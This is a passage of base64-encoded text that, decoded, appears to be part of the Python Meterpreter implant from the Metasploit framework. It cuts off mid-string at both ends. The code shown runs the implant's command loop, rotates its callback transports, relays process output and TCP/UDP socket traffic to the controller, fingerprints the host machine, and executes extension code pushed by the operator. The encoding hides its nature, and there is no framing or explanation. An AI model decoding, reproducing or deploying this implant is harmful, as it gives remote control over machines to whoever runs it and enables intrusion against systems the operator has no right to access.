YnVnX3ByaW50KCdbKl0gY2hhbmdpbmcgdHJhbnNwb3J0IHRvOiAnICsgbmV3X3RyYW5zcG9ydC51cmwpCiAgICAgICAgc2VsZi50cmFuc3BvcnQgPSBuZXdfdHJhbnNwb3J0CgogICAgZGVmIHRyYW5zcG9ydF9uZXh0KHNlbGYsIGN1cnJlbnRfdHJhbnNwb3J0PU5vbmUpOgogICAgICAgIGlmIGN1cnJlbnRfdHJhbnNwb3J0IGlzIE5vbmU6CiAgICAgICAgICAgIGN1cnJlbnRfdHJhbnNwb3J0ID0gc2VsZi50cmFuc3BvcnQKICAgICAgICBuZXdfaWR4ID0gc2VsZi50cmFuc3BvcnRzLmluZGV4KGN1cnJlbnRfdHJhbnNwb3J0KSArIDEKICAgICAgICBpZiBuZXdfaWR4ID09IGxlbihzZWxmLnRyYW5zcG9ydHMpOgogICAgICAgICAgICBuZXdfaWR4ID0gMAogICAgICAgIHJldHVybiBzZWxmLnRyYW5zcG9ydHNbbmV3X2lkeF0KCiAgICBkZWYgdHJhbnNwb3J0X3ByZXYoc2VsZiwgY3VycmVudF90cmFuc3BvcnQ9Tm9uZSk6CiAgICAgICAgaWYgY3VycmVudF90cmFuc3BvcnQgaXMgTm9uZToKICAgICAgICAgICAgY3VycmVudF90cmFuc3BvcnQgPSBzZWxmLnRyYW5zcG9ydAogICAgICAgIG5ld19pZHggPSBzZWxmLnRyYW5zcG9ydHMuaW5kZXgoY3VycmVudF90cmFuc3BvcnQpIC0gMQogICAgICAgIGlmIG5ld19pZHggPT0gLTE6CiAgICAgICAgICAgIG5ld19pZHggPSBsZW4oc2VsZi50cmFuc3BvcnRzKSAtIDEKICAgICAgICByZXR1cm4gc2VsZi50cmFuc3BvcnRzW25ld19pZHhdCgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICB3aGlsZSBzZWxmLnJ1bm5pbmcgYW5kIG5vdCBzZWxmLnNlc3Npb25faGFzX2V4cGlyZWQ6CiAgICAgICAgICAgIHJlcXVlc3QgPSBzZWxmLmdldF9wYWNrZXQoKQogICAgICAgICAgICBpZiByZXF1ZXN0OgogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSBzZWxmLmNyZWF0ZV9yZXNwb25zZShyZXF1ZXN0KQogICAgICAgICAgICAgICAgaWYgcmVzcG9uc2U6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX3BhY2tldChyZXNwb25zZSkKICAgICAgICAgICAgICAgIGlmIHNlbGYuX3RyYW5zcG9ydF9zbGVlcDoKICAgICAgICAgICAgICAgICAgICBzZWxmLnRyYW5zcG9ydC5kZWFjdGl2YXRlKCkKICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKHNlbGYuX3RyYW5zcG9ydF9zbGVlcCkKICAgICAgICAgICAgICAgICAgICBzZWxmLl90cmFuc3BvcnRfc2xlZXAgPSBOb25lCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHNlbGYudHJhbnNwb3J0LmFjdGl2YXRlKCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudHJhbnNwb3J0X2NoYW5nZSgpCiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgIyBpdGVyYXRlIG92ZXIgdGhlIGtleXMgYmVjYXVzZSBzZWxmLmNoYW5uZWxzIGNvdWxkIGJlIG1vZGlmaWVkIGlmIG9uZSBpcyBjbG9zZWQKICAgICAgICAgICAgY2hhbm5lbF9pZHMgPSBsaXN0KHNlbGYuY2hhbm5lbHMua2V5cygpKQogICAgICAgICAgICBmb3IgY2hhbm5lbF9pZCBpbiBjaGFubmVsX2lkczoKICAgICAgICAgICAgICAgIGNoYW5uZWwgPSBzZWxmLmNoYW5uZWxzW2NoYW5uZWxfaWRdCiAgICAgICAgICAgICAgICBkYXRhID0gYnl0ZXMoKQogICAgICAgICAgICAgICAgd3JpdGVfcmVxdWVzdF9wYXJ0cyA9IFtdCiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKGNoYW5uZWwsIE1ldGVycHJldGVyUHJvY2Vzcyk6CiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGNoYW5uZWxfaWQgaW4gc2VsZi5pbnRlcmFjdF9jaGFubmVsczoKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBwcm9jX2ggPSBjaGFubmVsLnByb2NfaAogICAgICAgICAgICAgICAgICAgIGlmIHByb2NfaC5zdGRlcnJfcmVhZGVyLmlzX3JlYWRfcmVhZHkoKToKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHByb2NfaC5zdGRlcnJfcmVhZGVyLnJlYWQoKQogICAgICAgICAgICAgICAgICAgIGVsaWYgcHJvY19oLnN0ZG91dF9yZWFkZXIuaXNfcmVhZF9yZWFkeSgpOgogICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gcHJvY19oLnN0ZG91dF9yZWFkZXIucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBub3QgY2hhbm5lbC5pc19hbGl2ZSgpOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmhhbmRsZV9kZWFkX3Jlc291cmNlX2NoYW5uZWwoY2hhbm5lbF9pZCkKICAgICAgICAgICAgICAgIGVsaWYgaXNpbnN0YW5jZShjaGFubmVsLCBNZXRlcnByZXRlclNvY2tldFRDUENsaWVudCk6CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgc2VsZWN0LnNlbGVjdChbY2hhbm5lbC5maWxlbm8oKV0sIFtdLCBbXSwgMClbMF06CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQgPSBjaGFubmVsLnJlYWQoMSkKICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQgPSBieXRlcygpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbihkKSA9PSAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5oYW5kbGVfZGVhZF9yZXNvdXJjZV9jaGFubmVsKGNoYW5uZWxfaWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICBkYXRhICs9IGQKICAgICAgICAgICAgICAgIGVsaWYgaXNpbnN0YW5jZShjaGFubmVsLCBNZXRlcnByZXRlclNvY2tldFRDUFNlcnZlcik6CiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZWN0LnNlbGVjdChbY2hhbm5lbC5maWxlbm8oKV0sIFtdLCBbXSwgMClbMF06CiAgICAgICAgICAgICAgICAgICAgICAgIChjbGllbnRfc29jaywgY2xpZW50X2FkZHIpID0gY2hhbm5lbC5zb2NrLmFjY2VwdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIHNlcnZlcl9hZGRyID0gY2hhbm5lbC5zb2NrLmdldHNvY2tuYW1lKCkKICAgICAgICAgICAgICAgICAgICAgICAgY2xpZW50X2NoYW5uZWxfaWQgPSBzZWxmLmFkZF9jaGFubmVsKE1ldGVycHJldGVyU29ja2V0VENQQ2xpZW50KGNsaWVudF9zb2NrKSkKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX3BhY2tldCh0bHZfcGFja19yZXF1ZXN0KCd0Y3BfY2hhbm5lbF9vcGVuJywgWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyd0eXBlJzogVExWX1RZUEVfQ0hBTk5FTF9JRCwgJ3ZhbHVlJzogY2xpZW50X2NoYW5uZWxfaWR9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgeyd0eXBlJzogVExWX1RZUEVfQ0hBTk5FTF9QQVJFTlRJRCwgJ3ZhbHVlJzogY2hhbm5lbF9pZH0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7J3R5cGUnOiBUTFZfVFlQRV9MT0NBTF9IT1NULCAndmFsdWUnOiBpbmV0X3B0b24oY2hhbm5lbC5zb2NrLmZhbWlseSwgc2VydmVyX2FkZHJbMF0pfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsndHlwZSc6IFRMVl9UWVBFX0xPQ0FMX1BPUlQsICd2YWx1ZSc6IHNlcnZlcl9hZGRyWzFdfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsndHlwZSc6IFRMVl9UWVBFX1BFRVJfSE9TVCwgJ3ZhbHVlJzogaW5ldF9wdG9uKGNsaWVudF9zb2NrLmZhbWlseSwgY2xpZW50X2FkZHJbMF0pfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsndHlwZSc6IFRMVl9UWVBFX1BFRVJfUE9SVCwgJ3ZhbHVlJzogY2xpZW50X2FkZHJbMV19LAogICAgICAgICAgICAgICAgICAgICAgICBdKSkKICAgICAgICAgICAgICAgIGVsaWYgaXNpbnN0YW5jZShjaGFubmVsLCBNZXRlcnByZXRlclNvY2tldFVEUENsaWVudCk6CiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZWN0LnNlbGVjdChbY2hhbm5lbC5maWxlbm8oKV0sIFtdLCBbXSwgMClbMF06CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEsIHBlZXJfYWRkcmVzcyA9IGNoYW5uZWwuc29jay5yZWN2ZnJvbSg2NTUzNSkKICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaGFuZGxlX2RlYWRfcmVzb3VyY2VfY2hhbm5lbChjaGFubmVsX2lkKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVfcmVxdWVzdF9wYXJ0cy5leHRlbmQoWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsndHlwZSc6IFRMVl9UWVBFX1BFRVJfSE9TVCwgJ3ZhbHVlJzogcGVlcl9hZGRyZXNzWzBdfSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7J3R5cGUnOiBUTFZfVFlQRV9QRUVSX1BPUlQsICd2YWx1ZSc6IHBlZXJfYWRkcmVzc1sxXX0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBdKQogICAgICAgICAgICAgICAgaWYgZGF0YToKICAgICAgICAgICAgICAgICAgICB3cml0ZV9yZXF1ZXN0X3BhcnRzLmV4dGVuZChbCiAgICAgICAgICAgICAgICAgICAgICAgIHsndHlwZSc6IFRMVl9UWVBFX0NIQU5ORUxfSUQsICd2YWx1ZSc6IGNoYW5uZWxfaWR9LAogICAgICAgICAgICAgICAgICAgICAgICB7J3R5cGUnOiBUTFZfVFlQRV9DSEFOTkVMX0RBVEEsICd2YWx1ZSc6IGRhdGF9LAogICAgICAgICAgICAgICAgICAgICAgICB7J3R5cGUnOiBUTFZfVFlQRV9MRU5HVEgsICd2YWx1ZSc6IGxlbihkYXRhKX0sCiAgICAgICAgICAgICAgICAgICAgXSkKICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfcGFja2V0KHRsdl9wYWNrX3JlcXVlc3QoJ2NvcmVfY2hhbm5lbF93cml0ZScsIHdyaXRlX3JlcXVlc3RfcGFydHMpKQoKICAgIGRlZiBoYW5kbGVfZGVhZF9yZXNvdXJjZV9jaGFubmVsKHNlbGYsIGNoYW5uZWxfaWQpOgogICAgICAgIGRlbCBzZWxmLmNoYW5uZWxzW2NoYW5uZWxfaWRdCiAgICAgICAgaWYgY2hhbm5lbF9pZCBpbiBzZWxmLmludGVyYWN0X2NoYW5uZWxzOgogICAgICAgICAgICBzZWxmLmludGVyYWN0X2NoYW5uZWxzLnJlbW92ZShjaGFubmVsX2lkKQogICAgICAgIHNlbGYuc2VuZF9wYWNrZXQodGx2X3BhY2tfcmVxdWVzdCgnY29yZV9jaGFubmVsX2Nsb3NlJywgWwogICAgICAgICAgICB7J3R5cGUnOiBUTFZfVFlQRV9DSEFOTkVMX0lELCAndmFsdWUnOiBjaGFubmVsX2lkfSwKICAgICAgICBdKSkKCiAgICBkZWYgX2NvcmVfc2V0X3V1aWQoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIG5ld191dWlkID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVVVJRCkKICAgICAgICBpZiBuZXdfdXVpZDoKICAgICAgICAgICAgUEFZTE9BRF9VVUlEID0gYmluYXNjaWkuYjJhX2hleChuZXdfdXVpZFsndmFsdWUnXSkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfZW51bWV4dGNtZChzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgZXh0ZW5zaW9uX25hbWUgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9TVFJJTkcpWyd2YWx1ZSddCiAgICAgICAgZm9yIGZ1bmNfbmFtZSBpbiBzZWxmLmV4dGVuc2lvbl9mdW5jdGlvbnMua2V5cygpOgogICAgICAgICAgICBpZiBmdW5jX25hbWUuc3BsaXQoJ18nLCAxKVswXSA9PSBleHRlbnNpb25fbmFtZToKICAgICAgICAgICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX1NUUklORywgZnVuY19uYW1lKQogICAgICAgIHJldHVybiBFUlJPUl9TVUNDRVNTLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV9nZXRfc2Vzc2lvbl9ndWlkKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9TRVNTSU9OX0dVSUQsIGJpbmFzY2lpLmEyYl9oZXgoYnl0ZXMoU0VTU0lPTl9HVUlELCAnVVRGLTgnKSkpCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgogICAgZGVmIF9jb3JlX3NldF9zZXNzaW9uX2d1aWQoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIG5ld19ndWlkID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfU0VTU0lPTl9HVUlEKQogICAgICAgIGlmIG5ld19ndWlkOgogICAgICAgICAgICBTRVNTSU9OX0dVSUQgPSBiaW5hc2NpaS5iMmFfaGV4KG5ld19ndWlkWyd2YWx1ZSddKQogICAgICAgIHJldHVybiBFUlJPUl9TVUNDRVNTLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV9tYWNoaW5lX2lkKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICBzZXJpYWwgPSAnJwogICAgICAgIG1hY2hpbmVfbmFtZSA9IHBsYXRmb3JtLnVuYW1lKClbMV0KICAgICAgICBpZiBoYXNfd2luZGxsOgogICAgICAgICAgICBmcm9tIGN0eXBlcyBpbXBvcnQgd2ludHlwZXMKCiAgICAgICAgICAgIGszMiA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIKICAgICAgICAgICAgc3lzX2RpciA9IGN0eXBlcy5jcmVhdGVfdW5pY29kZV9idWZmZXIoMjYwKQogICAgICAgICAgICBpZiBub3QgazMyLkdldFN5c3RlbURpcmVjdG9yeVcoY3R5cGVzLmJ5cmVmKHN5c19kaXIpLCAyNjApOgogICAgICAgICAgICAgICAgcmV0dXJuIEVSUk9SX0ZBSUxVUkVfV0lORE9XUwoKICAgICAgICAgICAgdm9sX2J1ZiA9IGN0eXBlcy5jcmVhdGVfdW5pY29kZV9idWZmZXIoMjYwKQogICAgICAgICAgICBmc19idWYgPSBjdHlwZXMuY3JlYXRlX3VuaWNvZGVfYnVmZmVyKDI2MCkKICAgICAgICAgICAgc2VyaWFsX251bSA9IHdpbnR5cGVzLkRXT1JEKDApCgogICAgICAgICAgICBpZiBub3QgazMyLkdldFZvbHVtZUluZm9ybWF0aW9uVyhjdHlwZXMuY193Y2hhcl9wKHN5c19kaXIudmFsdWVbOjNdKSwKICAgICAgICAgICAgICAgICAgICB2b2xfYnVmLCBjdHlwZXMuc2l6ZW9mKHZvbF9idWYpLCBjdHlwZXMuYnlyZWYoc2VyaWFsX251bSksIE5vbmUsCiAgICAgICAgICAgICAgICAgICAgTm9uZSwgZnNfYnVmLCBjdHlwZXMuc2l6ZW9mKGZzX2J1ZikpOgogICAgICAgICAgICAgICAgcmV0dXJuIEVSUk9SX0ZBSUxVUkVfV0lORE9XUwogICAgICAgICAgICBzZXJpYWxfbnVtID0gc2VyaWFsX251bS52YWx1ZQogICAgICAgICAgICBzZXJpYWwgPSAiJTA0eCIgJSAoKHNlcmlhbF9udW0gPj4gMTYpICYgMHhmZmZmKSArICctJyAiJTA0eCIgJSAoc2VyaWFsX251bSAmIDB4ZmZmZikKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZXJpYWwgPSBnZXRfaGRkX2xhYmVsKCkKCiAgICAgICAgcmVzcG9uc2UgKz0gdGx2X3BhY2soVExWX1RZUEVfTUFDSElORV9JRCwgIiVzOiVzIiAlIChzZXJpYWwsIG1hY2hpbmVfbmFtZSkpCiAgICAgICAgcmV0dXJuIEVSUk9SX1NVQ0NFU1MsIHJlc3BvbnNlCgogICAgZGVmIF9jb3JlX25hdGl2ZV9hcmNoKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9TVFJJTkcsIGdldF9uYXRpdmVfYXJjaCgpKQogICAgICAgIHJldHVybiBFUlJPUl9TVUNDRVNTLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV9wYXRjaF91cmwoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKHNlbGYudHJhbnNwb3J0LCBIdHRwVHJhbnNwb3J0KToKICAgICAgICAgICAgcmV0dXJuIEVSUk9SX0ZBSUxVUkUsIHJlc3BvbnNlCiAgICAgICAgbmV3X3VyaV9wYXRoID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfVVJMKVsndmFsdWUnXQogICAgICAgIGlmIG5vdCBzZWxmLnRyYW5zcG9ydC5wYXRjaF91cmlfcGF0aChuZXdfdXJpX3BhdGgpOgogICAgICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRSwgcmVzcG9uc2UKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfbG9hZGxpYihzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgZGF0YV90bHYgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9EQVRBKQogICAgICAgIGlmIChkYXRhX3RsdlsndHlwZSddICYgVExWX01FVEFfVFlQRV9DT01QUkVTU0VEKSA9PSBUTFZfTUVUQV9UWVBFX0NPTVBSRVNTRUQ6CiAgICAgICAgICAgIHJldHVybiBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQoKICAgICAgICBzZWxmLmxhc3RfcmVnaXN0ZXJlZF9leHRlbnNpb24gPSBOb25lCiAgICAgICAgc3ltYm9sc19mb3JfZXh0ZW5zaW9ucyA9IHsnbWV0ZXJwcmV0ZXInOnNlbGZ9CiAgICAgICAgc3ltYm9sc19mb3JfZXh0ZW5zaW9ucy51cGRhdGUoRVhQT1JURURfU1lNQk9MUykKICAgICAgICBpID0gY29kZS5JbnRlcmFjdGl2ZUludGVycHJldGVyKHN5bWJvbHNfZm9yX2V4dGVuc2lvbnMpCiAgICAgICAgaS5ydW5jb2RlKGNvbXBpbGUoZGF0YV90bHZbJ3ZhbHVlJ10sICcnLCAnZXhlYycpKQogICAgICAgIGV4dGVuc2lvbl9uYW1lID0gc2VsZi5sYXN0X3JlZ2lzdGVyZWRfZXh0ZW5zaW9uCgogICAgICAgIGlmIGV4dGVuc2lvbl9uYW1lOgogICAgICAgICAgICBjaGVja19leHRlbnNpb24gPSBsYW1iZGEgeDogeC5zdGFydHN3aXRoKGV4dGVuc2lvbl9uYW1lKQogICAgICAgICAgICBsaWJfbWV0aG9kcyA9IGxpc3QoZmlsdGVyKGNoZWNrX2V4dGVuc2lvbiwgbGlzdChzZWxmLmV4dGVuc2lvbl9mdW5jdGlvbnMua2V5cygpKSkpCiAgICAgICAgICAgIGZvciBtZXRob2QgaW4gbGliX21ldGhvZHM6CiAgICAgICAgICAgICAgICByZXNwb25zZSArPSB0bHZfcGFjayhUTFZfVFlQRV9NRVRIT0QsIG1ldGhvZCkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfc2h1dGRvd24oc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX0JPT0wsIFRydWUpCiAgICAgICAgc2VsZi5ydW5uaW5nID0gRmFsc2UKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfdHJhbnNwb3J0X2FkZChzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgbmV3X3RyYW5zcG9ydCA9IFRyYW5zcG9ydC5mcm9tX3JlcXVlc3QocmVxdWVzdCkKICAgICAgICBzZWxmLnRyYW5zcG9ydF9hZGQobmV3X3RyYW5zcG9ydCkKICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfdHJhbnNwb3J0X2NoYW5nZShzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgbmV3X3RyYW5zcG9ydCA9IFRyYW5zcG9ydC5mcm9tX3JlcXVlc3QocmVxdWVzdCkKICAgICAgICBzZWxmLnRyYW5zcG9ydF9hZGQobmV3X3RyYW5zcG9ydCkKICAgICAgICBzZWxmLnNlbmRfcGFja2V0KHJlc3BvbnNlICsgdGx2X3BhY2soVExWX1RZUEVfUkVTVUxULCBFUlJPUl9TVUNDRVNTKSkKICAgICAgICBzZWxmLnRyYW5zcG9ydF9jaGFuZ2UobmV3X3RyYW5zcG9ydCkKICAgICAgICByZXR1cm4gTm9uZQoKICAgIGRlZiBfY29yZV90cmFuc3BvcnRfbGlzdChzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgaWYgc2VsZi5zZXNzaW9uX2V4cGlyeV90aW1lID4gMDoKICAgICAgICAgICAgcmVzcG9uc2UgKz0gdGx2X3BhY2soVExWX1RZUEVfVFJBTlNfU0VTU0lPTl9FWFAsIHNlbGYuc2Vzc2lvbl9leHBpcnlfZW5kIC0gdGltZS50aW1lKCkpCiAgICAgICAgcmVzcG9uc2UgKz0gdGx2X3BhY2soVExWX1RZUEVfVFJBTlNfR1JPVVAsIHNlbGYudHJhbnNwb3J0LnRsdl9wYWNrX3RyYW5zcG9ydF9ncm91cCgpKQoKICAgICAgICB0cmFuc3BvcnQgPSBzZWxmLnRyYW5zcG9ydF9uZXh0KCkKICAgICAgICB3aGlsZSB0cmFuc3BvcnQgIT0gc2VsZi50cmFuc3BvcnQ6CiAgICAgICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX1RSQU5TX0dST1VQLCB0cmFuc3BvcnQudGx2X3BhY2tfdHJhbnNwb3J0X2dyb3VwKCkpCiAgICAgICAgICAgIHRyYW5zcG9ydCA9IHNlbGYudHJhbnNwb3J0X25leHQodHJhbnNwb3J0KQogICAgICAgIHJldHVybiBFUlJPUl9TVUNDRVNTLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV90cmFuc3BvcnRfbmV4dChzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgbmV3X3RyYW5zcG9ydCA9IHNlbGYudHJhbnNwb3J0X25leHQoKQogICAgICAgIGlmIG5ld190cmFuc3BvcnQgPT0gc2VsZi50cmFuc3BvcnQ6CiAgICAgICAgICAgIHJldHVybiBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQogICAgICAgIHNlbGYuc2VuZF9wYWNrZXQocmVzcG9uc2UgKyB0bHZfcGFjayhUTFZfVFlQRV9SRVNVTFQsIEVSUk9SX1NVQ0NFU1MpKQogICAgICAgIHNlbGYudHJhbnNwb3J0X2NoYW5nZShuZXdfdHJhbnNwb3J0KQogICAgICAgIHJldHVybiBOb25lCgogICAgZGVmIF9jb3JlX3RyYW5zcG9ydF9wcmV2KHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICBuZXdfdHJhbnNwb3J0ID0gc2VsZi50cmFuc3BvcnRfcHJldigpCiAgICAgICAgaWYgbmV3X3RyYW5zcG9ydCA9PSBzZWxmLnRyYW5zcG9ydDoKICAgICAgICAgICAgcmV0dXJuIEVSUk9SX0ZBSUxVUkUsIHJlc3BvbnNlCiAgICAgICAgc2VsZi5zZW5kX3BhY2tldChyZXNwb25zZSArIHRsdl9wYWNrKFRMVl9UWVBFX1JFU1VMVCwgRVJST1JfU1VDQ0VTUykpCiAgICAgICAgc2VsZi50cmFuc3BvcnRfY2hhbmdlKG5ld190cmFuc3BvcnQpCiAgICAgICAgcmV0dXJuIE5vbmUKCiAgICBkZWYgX2NvcmVfdHJhbnNwb3J0X3JlbW92ZShzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgdXJsID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfVVJMKVsndmFsdWUnXQogICAgICAgIGlmIHNlbGYudHJhbnNwb3J0LnVybCA9PSB1cmw6CiAgICAgICAgICAgIHJldHVybiBFUlJPUl9GQUlMVVJFLCByZXNwb25zZQogICAgICAgIHRyYW5zcG9ydF9mb3VuZCA9IEZhbHNlCiAgICAgICAgZm9yIHRyYW5zcG9ydCBpbiBzZWxmLnRyYW5zcG9ydHM6CiAgICAgICAgICAgIGlmIHRyYW5zcG9ydC51cmwgPT0gdXJsOgogICAgICAgICAgICAgICAgdHJhbnNwb3J0X2ZvdW5kID0gVHJ1ZQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBpZiB0cmFuc3BvcnRfZm91bmQ6CiAgICAgICAgICAgIHNlbGYudHJhbnNwb3J0cy5yZW1vdmUodHJhbnNwb3J0KQogICAgICAgICAgICByZXR1cm4gRVJST1JfU1VDQ0VTUywgcmVzcG9uc2UKICAgICAgICByZXR1cm4gRVJST1JfRkFJTFVSRSwgcmVzcG9uc2UKCiAgICBkZWYgX2NvcmVfdHJhbnNwb3J0X3NldF90aW1lb3V0cyhzZWxmLCByZXF1ZXN0LCByZXNwb25zZSk6CiAgICAgICAgdGltZW91dF92YWx1ZSA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX1RSQU5TX1NFU1NJT05fRVhQKS5nZXQoJ3ZhbHVlJykKICAgICAgICBpZiBub3QgdGltZW91dF92YWx1ZSBpcyBOb25lOgogICAgICAgICAgICBzZWxmLnNlc3Npb25fZXhwaXJ5X3RpbWUgPSB0aW1lb3V0X3ZhbHVlCiAgICAgICAgICAgIHNlbGYuc2Vzc2lvbl9leHBpcnlfZW5kID0gdGltZS50aW1lKCkgKyBzZWxmLnNlc3Npb25fZXhwaXJ5X3RpbWUKICAgICAgICB0aW1lb3V0X3ZhbHVlID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfVFJBTlNfQ09NTV9USU1FT1VUKS5nZXQoJ3ZhbHVlJykKICAgICAgICBpZiB0aW1lb3V0X3ZhbHVlOgogICAgICAgICAgICBzZWxmLnRyYW5zcG9ydC5jb21tdW5pY2F0aW9uX3RpbWVvdXQgPSB0aW1lb3V0X3ZhbHVlCiAgICAgICAgcmV0cnlfdmFsdWUgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCBUTFZfVFlQRV9UUkFOU19SRVRSWV9UT1RBTCkuZ2V0KCd2YWx1ZScpCiAgICAgICAgaWYgcmV0cnlfdmFsdWU6CiAgICAgICAgICAgIHNlbGYudHJhbnNwb3J0LnJldHJ5X3RvdGFsID0gcmV0cnlfdmFsdWUKICAgICAgICByZXRyeV92YWx1ZSA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX1RSQU5TX1JFVFJZX1dBSVQpLmdldCgndmFsdWUnKQogICAgICAgIGlmIHJldHJ5X3ZhbHVlOgogICAgICAgICAgICBzZWxmLnRyYW5zcG9ydC5yZXRyeV93YWl0ID0gcmV0cnlfdmFsdWUKCiAgICAgICAgaWYgc2VsZi5zZXNzaW9uX2V4cGlyeV90aW1lID4gMDoKICAgICAgICAgICAgcmVzcG9uc2UgKz0gdGx2X3BhY2soVExWX1RZUEVfVFJBTlNfU0VTU0lPTl9FWFAsIHNlbGYuc2Vzc2lvbl9leHBpcnlfZW5kIC0gdGltZS50aW1lKCkpCiAgICAgICAgcmVzcG9uc2UgKz0gc2VsZi50cmFuc3BvcnQudGx2X3BhY2tfdGltZW91dHMoKQogICAgICAgIHJldHVybiBFUlJPUl9TVUNDRVNTLCByZXNwb25zZQoKICAgIGRlZiBfY29yZV90cmFuc3BvcnRfc2xlZXAoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIHNlY29uZHMgPSBwYWNrZXRfZ2V0X3RsdihyZXF1ZXN0LCB